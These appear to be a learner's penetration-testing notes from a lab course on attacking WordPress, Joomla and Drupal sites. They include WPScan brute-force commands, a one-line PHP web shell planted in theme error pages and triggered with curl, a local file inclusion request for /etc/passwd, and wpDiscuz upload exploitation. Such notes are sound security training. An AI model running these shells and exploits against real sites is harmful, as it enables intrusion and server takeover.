* A lot of the apps will need to be manually added to the `/etc/hosts` file. Modify this oneliner to do it quick:
```bash
$ IP=10.129.42.195
$ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```
Nmap Web discovery script
```bash
nmap -p 80,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list
```
* many orgs have large amounts of hosts running on ports 80 and 443 alone
	* unrealistic to individually navigate to them all
	* can use `EyeWitness` and `Aquatone` to feed in raw Nmap XML scan output to inspect and screenshot all hosts much quicker
		* can help narrow down
* scope list could look like this:
	* app.inlanefreight.local
	* 10.129.201.50
* Example Eyewitness oneliner:
```bash
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

# Wordpress
* php backend!
### Discovery
Typical `/robots.txt` file:
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```
* 5 types of users on standard WP install:
	* Administrator
	* Editor
	* Author
	* Contributor
	* Subscriber
* Another way to identify a wp site is to curl it and grep for `wordpress`
* can identify plugins by running `curl -s http://blog.inlanefreight.local/ | grep plugins`
* most plugins have a readme.txt file where you can find version and more info
* can find them at `http://blog.inlanefreight.local/wp-content/plugins` OR `http://blog.inlanefreight.local/?p=1/wp-content/pplugins`

### Enum on users
* A valid username and an invalid password results in the following message:
	* ***Error:** The password you entered for the username **USER** is incorrect*
* an invalid username returns that the user was not found

### WPScan
* `--enumerate` flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users
	* all plugins can be enumerated using the arguments `--enumerate ap`
	* Can pass in in API tokens from WPVulnDB with `--api-token` flag
* default number of threads is `5`
	* can be changed with `-t` flag

### Login Bruteforce
* WPscan can do this
* two kinds of attacks 
	* `wp-login` will attempt to bruteforce the standard login page
	* `xmlrpc` uses wordpress API to make login attempts through `/.xmlrpc.php`
		* generally faster
* ex:
```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### Code Execution
* Done with wp themes
* click on `appearance` and select theme editor
* An inactive theme can be selected to avoid corrupting the primary theme
* Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell
* This code should let us execute commands via the GET parameter `0`
	* avoids too much modification of contents
```php
system($_GET[0]);
```
* Click on `Update File` at the bottom to save
* can use curl to gain access
```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```
* `wp_admin_shell_upload` in metasploit can be used to upload a shell and execute it automatically
	* the `php/meterpreter/reverse_tcp` payload should work fine
* Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail
	* make sure to document and clean up
* most vulns in wordpress are with the plugins (89%)
* Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.

**Mail-masta plugin***
* Since 2016 it has suffered an unauthenticated SQL injection and a Local File Inclusion
* Vulnerable code:
```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```
* the `pl` parameter allows us to include a file without any type of input validation or sanitization
	* Using this, we can include arbitrary files on the webserver
* Exploit:
```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**wpDiscuz plugin**
* The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution
* Exploit script:
	* can be downloaded from exploitdb
```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```
* may fail, but can still use curl to execute commands after the script was run:
```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```
* Make sure to cleanup the `.php` file left behind

# Joomla
* another Content Management System like wordpress, just not as popular
* can fingerprint by looking at the page source: `curl -s http://dev.inlanefreight.local/ | grep Joomla`
* ex robots.txt file
```bash
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
* can fingerprint version if the readme.txt is present
* can use `droopscan` for limited enumeration
	* can git clone it or install via pip
* `joomscan` is now out of date and needs python 2.7 to run, but can still be helpful
* administrator login portal located at `http://dev.inlanefreight.local/administrator/index.php`
* default admin account is `admin`
	* password set at install time
* script to brute force the login:
```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
### Attacking Joomla
* Once logged in, can get rce from adding a php script to a template
	* click on `templates` under `configuration`
		* htb lied; it's under `extensions`
	* click on a template name, go to the `customise` page
		* ex: `protostar`
	* try using the `error.php` page
	* One liner for ce:
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
* save and close
* confirm with curl:
```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

# Drupal
* another CMS
* for discovery check out `robots.txt` or just grep for drupal in the initial curl
* Drupal indexes its content using nodes
	* A node can hold anything such as a blog post, poll, article, etc
	* The page URIs are usually of the form `/node/<nodeid>`
* 3 types of users by default:
	* `Administrator`
	* `Authenticatd User`
	* `Anonymous`
* For enum check the `changelog.txt` and `readme.txt` files
	* may be blocked though
* version number enum script for older versions:
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```
 * Can use `droopescan` for further enum
	 * Has much more functionality than it does for joomla
```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```
